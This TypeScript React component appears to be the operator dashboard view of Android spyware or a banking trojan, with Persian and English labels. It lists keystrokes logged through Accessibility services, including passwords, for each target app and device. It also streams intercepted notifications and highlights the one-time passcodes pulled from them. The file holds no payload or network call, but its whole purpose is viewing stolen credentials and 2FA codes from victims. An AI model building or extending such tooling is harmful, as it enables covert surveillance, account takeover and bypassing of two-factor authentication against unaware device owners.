import React, { useState } from 'react';
import { useDashboard } from '../../context/DashboardContext';
import { 
  Keyboard, 
  Bell, 
  Search, 
  KeyRound, 
  Copy, 
  Check, 
  ShieldAlert, 
  Clock, 
  Smartphone 
} from 'lucide-react';
import { t } from '../../utils/translations';

export const KeyloggerView: React.FC = () => {
  const { 
    lang, 
    keylogsList, 
    notificationsList, 
    selectedDevice, 
    setToastMessage 
  } = useDashboard();

  const labels = t[lang];
  const [activeTab, setActiveTab] = useState<'keys' | 'notifs'>('keys');
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setToastMessage(lang === 'fa' ? 'متن در کلیپ‌بورد کپی شد' : 'Text copied to clipboard');
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredKeylogs = keylogsList.filter(k => {
    return k.text.toLowerCase().includes(searchQuery.toLowerCase()) ||
           k.targetApp.toLowerCase().includes(searchQuery.toLowerCase()) ||
           k.fieldHint.toLowerCase().includes(searchQuery.toLowerCase());
  });

  const filteredNotifs = notificationsList.filter(n => {
    return n.text.toLowerCase().includes(searchQuery.toLowerCase()) ||
           n.appName.toLowerCase().includes(searchQuery.toLowerCase()) ||
           n.title.toLowerCase().includes(searchQuery.toLowerCase());
  });

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-b border-slate-800/60 pb-4">
        <div>
          <h1 className="text-xl font-bold tracking-tight text-white">
            {labels.navKeylogger}
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            {lang === 'fa' 
              ? 'ردیابی ضربات کلید از طریق Accessibility Service و شنود لحظه‌ای اعلان‌های ورودی' 
              : 'Keystroke logging via Accessibility node changes and notification interception'}
          </p>
        </div>

        <div className="flex items-center gap-2">
          {/* Sub Navigation */}
          <div className="flex items-center bg-slate-900 border border-slate-800 rounded-lg p-1">
            <button
              onClick={() => setActiveTab('keys')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-colors cursor-pointer flex items-center gap-1.5 ${
                activeTab === 'keys' ? 'bg-cyan-600 text-slate-950 font-semibold' : 'text-slate-400 hover:text-white'
              }`}
            >
              <Keyboard className="w-3.5 h-3.5" />
              <span>{lang === 'fa' ? 'کی‌لاگر و رمزها' : 'Keystrokes & Passwords'}</span>
            </button>
            <button
              onClick={() => setActiveTab('notifs')}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition-colors cursor-pointer flex items-center gap-1.5 ${
                activeTab === 'notifs' ? 'bg-cyan-600 text-slate-950 font-semibold' : 'text-slate-400 hover:text-white'
              }`}
            >
              <Bell className="w-3.5 h-3.5" />
              <span>{lang === 'fa' ? 'شنود اعلان‌ها (Push)' : 'Notification Stream'}</span>
            </button>
          </div>
        </div>
      </div>

      {/* Search Input */}
      <div className="flex items-center justify-between gap-3 bg-slate-900/40 p-3 rounded-xl border border-slate-800/80">
        <div className="relative flex-1 max-w-md">
          <Search className="w-4 h-4 text-slate-500 absolute start-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder={lang === 'fa' ? 'جستجو در متن‌های ثبت‌شده یا عنوان اپلیکیشن...' : 'Search logged text or app title...'}
            className="w-full bg-slate-950 border border-slate-800 rounded-lg ps-9 pe-3 py-2 text-xs text-slate-200 placeholder-slate-500 outline-none focus:border-cyan-500"
          />
        </div>
      </div>

      {activeTab === 'keys' ? (
        /* Keylogger List */
        <div className="space-y-3">
          {filteredKeylogs.length === 0 ? (
            <div className="p-8 text-center text-slate-500 bg-slate-900/40 rounded-xl border border-slate-800">
              {lang === 'fa' ? 'موردی برای نمایش یافت نشد' : 'No keystrokes recorded matching filter'}
            </div>
          ) : (
            filteredKeylogs.map((record) => (
              <div
                key={record.id}
                className="p-4 rounded-xl bg-slate-900/60 border border-slate-800/80 hover:border-slate-700 transition-all space-y-2"
              >
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span className="font-semibold text-white">{record.targetApp}</span>
                    <span className="text-[11px] font-mono text-slate-400">({record.packageName})</span>
                  </div>
                  <div className="flex items-center gap-2 text-[11px] text-slate-400 font-mono">
                    <Clock className="w-3 h-3 text-slate-500" />
                    <span>{record.timestamp}</span>
                  </div>
                </div>

                <div className="text-[11px] text-cyan-400/90 font-medium">
                  {lang === 'fa' ? 'فیلد شناسایی‌شده:' : 'Identified Input:'} {record.fieldHint}
                </div>

                <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs text-slate-200 flex items-center justify-between gap-4">
                  <span className="break-all">{record.text}</span>
                  <button
                    onClick={() => handleCopy(record.text, record.id)}
                    className="p-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors shrink-0 cursor-pointer"
                    title={lang === 'fa' ? 'کپی متن' : 'Copy text'}
                  >
                    {copiedId === record.id ? (
                      <Check className="w-3.5 h-3.5 text-emerald-400" />
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      ) : (
        /* Notifications Stream */
        <div className="space-y-3">
          {filteredNotifs.length === 0 ? (
            <div className="p-8 text-center text-slate-500 bg-slate-900/40 rounded-xl border border-slate-800">
              {lang === 'fa' ? 'اعلانی یافت نشد' : 'No notifications intercepted'}
            </div>
          ) : (
            filteredNotifs.map((notif) => (
              <div
                key={notif.id}
                className={`p-4 rounded-xl border transition-all ${
                  notif.containsOtp
                    ? 'bg-amber-950/20 border-amber-500/40'
                    : 'bg-slate-900/60 border-slate-800/80'
                }`}
              >
                <div className="flex items-center justify-between text-xs mb-1">
                  <span className="font-semibold text-white">{notif.appName} · {notif.title}</span>
                  <span className="text-[11px] text-slate-400 font-mono">{notif.timestamp}</span>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed font-sans mb-2">
                  {notif.text}
                </p>
                {notif.containsOtp && notif.otp && (
                  <div className="inline-flex items-center gap-2 p-1.5 rounded bg-slate-950 border border-amber-500/40 text-xs font-mono">
                    <KeyRound className="w-3.5 h-3.5 text-amber-400" />
                    <span className="text-slate-300">OTP:</span>
                    <span className="text-amber-400 font-bold">{notif.otp}</span>
                  </div>
                )}
              </div>
            ))
          )}
        </div>
      )}
    </div>
  );
};
